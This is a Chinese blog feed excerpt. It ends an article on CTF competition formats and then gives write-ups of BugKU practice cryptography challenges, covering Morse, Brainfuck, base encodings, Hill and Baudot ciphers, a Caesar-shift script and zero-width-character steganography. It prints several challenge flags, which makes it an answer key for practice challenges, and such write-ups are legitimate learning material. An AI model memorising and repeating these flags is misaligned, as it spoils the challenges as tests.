Time，当选手认为自己已经可以完成题目时，选手可以在比赛平台上提交展示申请，由工作人员根据申请先后顺序进行展示排期。选手展示之前需要上台并连接相关网络，同时现场大屏会切换至目标的正常页面。选手确认连接并测试OK之后开始计时。一般情况下上台攻击的时间为5分钟，选手一旦完成攻击现场大屏幕会实时看到攻击的效果，此时裁判会根据效果是否符合题目要求来判定该题是否完成。如5在攻击时间内依然未能看到展示效果则认为本次攻击失败。现如今为了防止选手恶意排期。通常会有一个队伍总展示次数(例如在2019年数字经济云安全公测大赛中每个队伍只允许上台展示30次)，选手也需要尽可能保证上台之后攻击的成功率 举个例子。题目要求需要攻击位于比赛网络中的某个网站并将首页替换为包含队伍名称的页面。题目给出该网站的一些信息(源代码/数据库等等)，选手经过本地挖掘漏洞之后，提交展示申请，排期到了之后进行上台展示。注意，因为RW模式是以展示效果来作为题目是否完成的准则，所以在RW模式中并不存在Flag。</p><h2 id="KoH-抢占山头"><a href="#KoH-抢占山头" class="headerlink" title="KoH 抢占山头"></a>KoH 抢占山头</h2><p><strong>King of Hill</strong>是近些年新衍生的一种赛制。该赛制有点类似于AwD，但是又和AwD有些不一样。选手面对的是一个黑盒的目标，需要先挖掘漏洞并利用漏洞控制目标。将自己的队伍标识(队伍名称或是Token之类)写入到指定文件。随后在该主机上进行加固等操作防止其他队伍攻击，主办方会定期去检查标识文件，根据文件中的队伍标识来判定本回合分数给予哪个队伍。可以看出KoH也是一种对抗极为激烈的赛制，同时考察选手的渗透能力及防御加固能力。</p><h2 id="Mix-混合"><a href="#Mix-混合" class="headerlink" title="Mix  混合"></a>Mix  混合</h2><p>​    混合模式结合了以上多种模式，现如今单一的赛制已经无法满足比赛及选手的参赛需求，所以大部分比赛会同时以多个模式进行比赛。例如参赛队伍通过解题(Jeopardy)可以获取一些初始分数，然后通过攻防对抗(AwD)进行得分增减的零和游戏，最终以得分高低分出胜负。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugKU靶场解题记录Crypto篇</title>
      <link href="/2021/10/03/BugKU%E9%9D%B6%E5%9C%BA%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95Crypto%E7%AF%87/"/>
      <url>/2021/10/03/BugKU%E9%9D%B6%E5%9C%BA%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95Crypto%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<hr><h1><center>BugKU靶场解题记录Crypto篇</center></h1><p>[TOC]</p><h4 id="1">1 /.-</h4><blockquote><p>…-./.-…/.-/–./----.–/-…/…–/…-./-.-./-…/…-./.----/–…/…-./----./…–/----./----./…/-----/…-/-----.-</p></blockquote><p>一个很简单的莫斯密码题，使用线上的<a href="https://tool.bugku.com/mosi/">解题工具</a>即可完成。注意*%u7b<em>和</em>%u7d*分别是**{** 和 <strong>}</strong>。</p><h4 id="2-聪明的小羊">2  聪明的小羊</h4><p>题干是一只小羊翻过了2个栅栏 fa{fe13f590lg6d46d0d0}，提示的很清楚栅栏密码，直接解码就行。</p><h4 id="3-okk">3 okk</h4><p>说真的我并不知道这道题的考点在哪里。下载是一个txt文件，打开一大串由okk组成的字符，使用<a href="https://ctf.bugku.com/tool/brainfuck">在线工具解码</a>就行。</p><blockquote><p>okk密码实际上是一种编程语言，由okk. okk? okk!组成。</p></blockquote><h4 id="4">4 [±&lt;&gt;]</h4><p>说真的这道题跟上一道题是接近一毛一样，这是使用的是一款可读性几乎为0的语言:Brainfuck!<br>解码还是用上一道题的链接就行，bugku本站将两种编码的在线解码放在了同一个工具里。</p><h4 id="5-你以为是md5吗">5 你以为是md5吗</h4><blockquote><p>bci177a7a9c7udf69c248647b4dfc6fd84o 是又不是就是玩</p></blockquote><p>确实是md5，但是md5是16进制的包含0到9和a到f一共16个字符，这道题给的包含了超出f的字符，删去这一部分就能得到正确的编码。解码可得结果。不得不说真的666666啊。</p><h4 id="6-这不是md5">6 这不是md5</h4><p>说实话这道题还真不是md5，就是一段16进制数，直接转文本就行<strong>flag{ae73587ba56baef5}</strong></p><h4 id="7-一段base64">7 一段base64</h4><p>这段base64还真是够长的，用在线解题工具已经不能将其解码了。不过还是可以利用工具converter进行解码。得道形如\134\170\65\143\134\170\67\65 的一段编码。百度得知是unescape编码。继续进项解码得到形如\x5c\x75\x30\x30\x35的编码这一部分还清楚是hex编码。将他转化为text。得到一堆我又不认识的密码。。。<br>结果看了下别人的解题他们告诉我这还是unescape，继续解码发现<strong>String.fromCharCode</strong>根据大佬的介绍这是JavaScript的函数，[]内的是里面的参数。然后将这一些删去对数字就是一种dec密码。继续解码。得到decode编码。继续解码。得到Unicode编码.编码可得。</p><blockquote><p>flag%7Bctf_tfc201717qwe%7D</p></blockquote><p>其中%7b是 <strong>{</strong> ，%7d是 <strong>}</strong>。<br>得到flag。这道做的时候是转的最晕的一次，使用的密码太多了。</p><h4 id="8-base家族">8 base家族</h4><p>这确实不是base64，不是base32，不是base16.这是神奇的base91…</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;554a5058c9021c76&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="9-把猪困在猪圈里">9 把猪困在猪圈里</h4><p>题目提示的很清楚是与猪圈密码有关。打开是一段base64编码，我们知道猪圈密码是一堆特殊符号。这就很有可能是要将base64密码转为图片。在文本最前方加上data:image/jpg;base64,然后用在线工具编码出对应图片。</p><p><img src="https://upload-images.jianshu.io/upload_images/24919094-c63759746f45889a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p><p>就是这个，对应解码得到<strong>flag{thisispigpassword}</strong></p><blockquote><p>由于比较忙碌这个解题，包括之前的web和之后写的杂项都会持续更新的。</p></blockquote><h4 id="10">10 .!?</h4><p>这像不像前面的okk，实际上这就是一种变形的okk密码，省略okk只使用.!?进行描述。用在线工具解题即可获得flag。</p><h4 id="11-散乱的密码">11 散乱的密码</h4><p>看这个题第一眼以为是栅栏密码，但又有2 1 6 5 3 4这样的提示，这让我想到了ADFGX密码。仔细一数 lf5{ag024c483549d7fd@@1}一共24个数，216534一共六个数。盲猜是变形对ADFGX，将每六个作为一组，按照216534的顺序进行排列。最后删去@@得到flag。</p><h4 id="12-en-气泡">12 EN-气泡</h4><p>提示的很清楚气泡，Bubble。这就是一串BubbleBubble密码。对文件多次解码得到flag。</p><h4 id="13-简单加密">13 简单加密</h4><p>题目信息里的AA实际上是提示，这个本质上是一个凯撒移位，但是凯撒移位是对字母进行移位，而这个是包含了字母数字和特殊符号。无法使用现成的工具。<br>写一个脚本。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">text <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入题目密文"</span><span class="token punctuation">)</span>text1<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> text<span class="token punctuation">:</span>    t<span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span>    text1<span class="token operator">+=</span>t<span class="token keyword">print</span><span class="token punctuation">(</span>text1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将字符进行移位得到a2V5ezY4NzQzMDAwNjUwMTczMjMwZTRhNThlZTE1M2M2OGU4fQ==，明显是base64密码，解码得flag。</p><h4 id="14-来自宇宙的信号">14 来自宇宙的信号</h4><p>下载下来是一张图片，评论区告诉我这是标准银河字母（Standard Galactic Alphabet）出自《<a href="https://baike.baidu.com/item/%E6%8C%87%E6%8C%A5%E5%AE%98%E5%9F%BA%E6%81%A9/10345602">指挥官基恩</a>》系列。后面又了解了下，突然发现这东西还是MC的附魔符号，感觉这么多年的我的世界白玩了。</p><h4 id="15-告诉你一个秘密">15 告诉你一个秘密。</h4><blockquote><p>636A56355279427363446C4A49454A7154534230526D6843 56445A31614342354E326C4B4946467A5769426961453067</p></blockquote><p>嗯这像是16进制数也像MD5，MD5解密什么都没有得到，使用16进制转字符串得到cjV5RyBscDlJIEJqTSB0RmhCVDZ1aCB5N2lKIFFzWiBiaE0g，用base64进行编码得到</p><pre class="line-numbers language-none"><code class="language-none">r5yG lp9I BjM tFhBT6uh y7iJ QsZ bhM <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>评论区有人告诉我们，这是键盘码，</p><blockquote><p>键盘密码应该不算是一种加密算法，但是一种有趣的设置密码方式。<br>他就是a-z(A-Z)对应成键盘上的字母，把键盘字母一行一行的对应即可。<br>例如被r5yg几个字母包围的是t。</p></blockquote><p>得到flag，注意最后的密码需要大写。</p><h4 id="16-小山丘的秘密">16 小山丘的秘密</h4><p>hill能有什么秘密呢，Hill Cipher正是希尔密码，观察图片，希尔密码需要秘钥字母表，密钥肯定就在图片中,图片看上去4和9的位置看上去像是缺了棋子，那么将它看作0，那么此处位置为 z ，其他位置如图所示，得到密钥</p><p><img src="https://upload-images.jianshu.io/upload_images/24919094-df5120eed9bd6250.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p><p>将其作为秘钥abczadefz<br>同时我们知道提示中他说A=1，我们要让密码表中Z=0，a=1；<br>将PLGTGBQHM小写进行解码，得到whatahill。扩上{}得到flag。</p><h4 id="17-你喜欢下棋吗">17 你喜欢下棋吗</h4><p>题干很清楚下棋，这个是波利比奥斯方阵密码，也叫棋盘密码。使用在线工具解码得到thisispolybius。这是txt文件的解压密码。</p><blockquote><p>一种5bit的编码<br>bugku{11111 11001 00011 00111 01001 11011 10110 11111 10000 01110 11011 10110 11111 01001 00001}</p></blockquote><p>评论区告诉我这是博多电码解码，好家伙出题人你做个人吧。<br>博多电码太过于古老，导致都没什么现成的公具。<a href="https://www.dcode.fr/baudot-code%E8%BF%99%E6%98%AF%E8%AF%84%E8%AE%BA%E5%8C%BA%E5%A4%A7%E4%BD%AC%E7%BB%99%E7%9A%84%E8%A7%A3%E7%A0%81%E7%BD%91%E5%9D%80%E3%80%82%E8%BF%98%E6%9C%89%E5%87%A0%E4%B8%AA%E7%BD%91%E5%9D%80%EF%BC%8C%E4%BD%86%E5%9B%A0%E4%B8%BA%E5%90%84%E7%A7%8D%E5%90%84%E6%A0%B7%E7%9A%84%E5%8E%9F%E5%9B%A0%E8%BF%9B%E4%B8%8D%E5%8E%BB%E3%80%82%E3%80%82%E3%80%82">https://www.dcode.fr/baudot-code这是评论区大佬给的解码网址。还有几个网址，但因为各种各样的原因进不去。。。</a><br>解码得到flag</p><h4 id="18-一段新闻">18 一段新闻</h4><blockquote><p>近日，教育部、财政部印发《关于实施中小学幼儿园教师国家级培训计划（2021—2025年）的通知》（以下简称《通知》），明确“十四五”期间“国培计划”实施思路、支持方向、工作重点，推进教师培训提质增效，助力教师队伍高质量发展。‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‌‍‍‍‌‍‌‍‌‌‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‌‌‌‍‍‍‌‌‌‌‌‌‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‌‍‍‍‍‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‌‌‍‍‍‌‌‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‌‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‍‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‌‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‍‌‌‌‌‍‍‌‍‌‌‍‍‍‍‌‌‍‌‌‌‍‌‌‌‍‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‍‌‌‌‍‍‍‍‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‌‍‍‍‍‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‌‌‍‍‍‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‌‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‍‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‌‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‍‌‌‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‌‌‌‌‌‍‍‍‌‌‌‍‍‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‍‌‌‌‌‌‌‍‌‍‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‌‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‍‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‌‌‌‌‌‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‍‍‍‍‌‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‌‌‌‍‌‌‌‌‌‌‌‍‍‍‍‍‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‌‍‍‍‌‍‌‍‌‌‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‌‌‌‍‍‍‌‌‌‌‌‌‍‌‍‍‌‍‌‌‍‍‌‌‌‌‌‌‌‌‌‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‍‍‍‍‌‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‍‌‌‌‍‍‍‍‌‌‍‌‍‍‌‍‌‌‍‍‍‌‌‌‌‌‌‌‌‌‌‌‍‍‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‌‌‍‍‍‍‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‍‍‌‌‍‌‍‌‌‍‍‍‍‍‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‍‌‌‌‍‌‍‌‍‌‍‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‍‌‌‌‌‍‍‌‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‍‌‌‍‌‌‌‍‌‌‌‍‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‍‌‌‌‍‍‍‍‌‍‍‌‍‌‌‍‍‍‍‌‌‌‍‍‍‍‌‌‍‌‍‍‌‍‌‌‍‍‍‌‌‌‌‌‌‌‌‌‌‌‍‍‌‍‍‍‍‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‌‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‍‌‌‌‌‍‍‌‍‌‌‍‍‍‍‌‌‌‍‍‍‍‌‌‍‌‍‍‌‍‌‌‍‍‍‌‌‌‌‌‌‌‌‌‌‌‍‍‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‌‌‌‍‌‌‌‌‌‌‌‍‍‍‍‍‌‌‍‍‌‍‌‌‍‍‍‍‌‌‍‌‌‌‍‌‌‌‍‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‍‌‌‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‌‌‌‍‌‌‌‌‌‌‌‍‍‍‍‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‌‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‍‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‌‌‌‌‌‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‍‍‍‍‌‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‍‌‌‍‌‌‌‍‌‌‌‍‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‍‌‌‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‌‌‌‍‌‌‌‌‌‌‌‍‍‍‍‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‌‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‍‌‌‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‌‌‌‍‌‌‌‌‌‌‌‍‍‍‍‍‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‌‌‌‍‌‌‌‌‌‌‌‍‍‍‍‍‌‌‍‍‌‍‌‌‍‍‍‍‌‌‍‌‌‌‍‌‌‌‍‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‍‌‌‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‌‌‌‍‌‌‌‌‌‌‌‍‍‍‍‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‌‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‍‌‌‌‌‍‍‌‍‌‌‍‍‍‍‌‌‌‍‍‍‍‌‌‍‌‍‍‌‍‌‌‍‍‍‌‌‌‌‌‌‌‌‌‌‌‍‍‌‍‍‍‍‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‌‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‍‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‌‌‌‌‌‍‍‍‌‌‍‍‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‌‍‍‍‍‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‌‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‍‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‌‌‌‌‌‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‍‍‍‍‌‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‌‌‌‍‌‌‌‌‌‌‌‍‍‍‍‍‌‌‍‍‌‍‌‌‍‍‍‍‌‌‍‌‌‌‍‌‌‌‍‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‍‌‌‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‌‌‌‍‌‌‌‌‌‌‌‍‍‍‍‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‌‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‍‌‌‌‌‍‍‌‍‌‌‍‍‍‍‌‌‌‍‍‍‍‌‌‍‌‍‍‌‍‌‌‍‍‍‌‌‌‌‌‌‌‌‌‌‌‍‍‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‌‌‍‍‍‍‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‍‍‌‌‍‌‍‌‌‍‍‍‍‍‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‍‌‌‌‍‌‍‌‍‌‍‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‍‌‌‌‌‍‍‌‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‌‌‌‍‌‌‌‌‌‌‌‍‍‍‍‍‌‌‍‍‌‍‌‌‍‍‍‍‌‌‍‌‌‌‍‌‌‌‍‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‍‌‌‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‌‌‌‍‌‌‌‌‌‌‌‍‍‍‍‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‌‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‍‌‌‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‌‌‌‍‌‌‌‌‌‌‌‍‍‍‍‍‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‌‍‍‍‌‍‌‍‌‌‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‌‌‌‍‍‍‌‌‌‌‌‌‍‌‍‍‌‍‌‌‍‍‍‌‌‌‌‌‍‍‍‌‌‌‍‍‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‍‌‌‌‌‌‌‍‌‍‌‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‍‌‌‌‍‍‍‍‌‌‍‌‍‍‌‍‌‌‍‍‍‌‌‌‌‌‌‌‌‌‌‌‍‍‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‌‌‌‍‌‌‌‌‌‌‌‍‍‍‍‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‌‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‍‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‌‌‌‌‌‍‍‍‌‌‍‍‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‌‍‍‍‍‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‌‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‍‌‌‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‌‌‍‍‍‍‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‍‍‌‌‍‌‍‌‌‍‍‍‍‍‍‍‍‍‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‌‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‍‌‌‌‌‍‍‌‍‌‌‍‍‍‍‌‌‌‍‍‍‍‌‌‍‌‍‍‌‍‌‌‍‍‍‌‌‌‌‌‌‌‌‌‌‌‍‍‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‌‍‍‍‍‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‌‌‍‍‍‌‌‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‍‌‌‍‌‌‌‍‌‌‌‍‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‍‌‌‌‍‍‍‍‌‍‍‌‍‌‌‍‍‍‍‌‌‌‍‍‍‍‌‌‍‌‍‍‌‍‌‌‍‍‍‌‌‌‌‌‌‌‌‌‌‌‍‍‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‍‌‌‌‍‍‍‍‌‌‍‌‍‍‌‍‌‌‍‍‍‌‌‌‌‌‌‌‌‌‌‌‍‍‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‌‌‌‍‌‌‌‌‌‌‌‍‍‍‍‍‌‌‍‍‌‍‌‌‍‍‍‍‌‌‍‌‌‌‍‌‌‌‍‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‍‌‌‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‌‌‌‍‌‌‌‌‌‌‌‍‍‍‍‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‌‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‍‌‌‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‌‌‍‍‍‍‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‍‍‌‌‍‌‍‌‌‍‍‍‍‍‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‌‍‍‍‌‍‌‍‌‌‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‌‌‌‍‍‍‌‌‌‌‌‌‍‌‍‍‌‍‌‌‍‍‌‌‌‌‌‌‌‌‌‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‍‍‍‍‌‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‌‌‍‍‍‍‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‍‍‌‌‍‌‍‌‌‍‍‍‍‍‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‌‌‌‌‌‌‌‌‌‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‍‍‍‍‌‍‌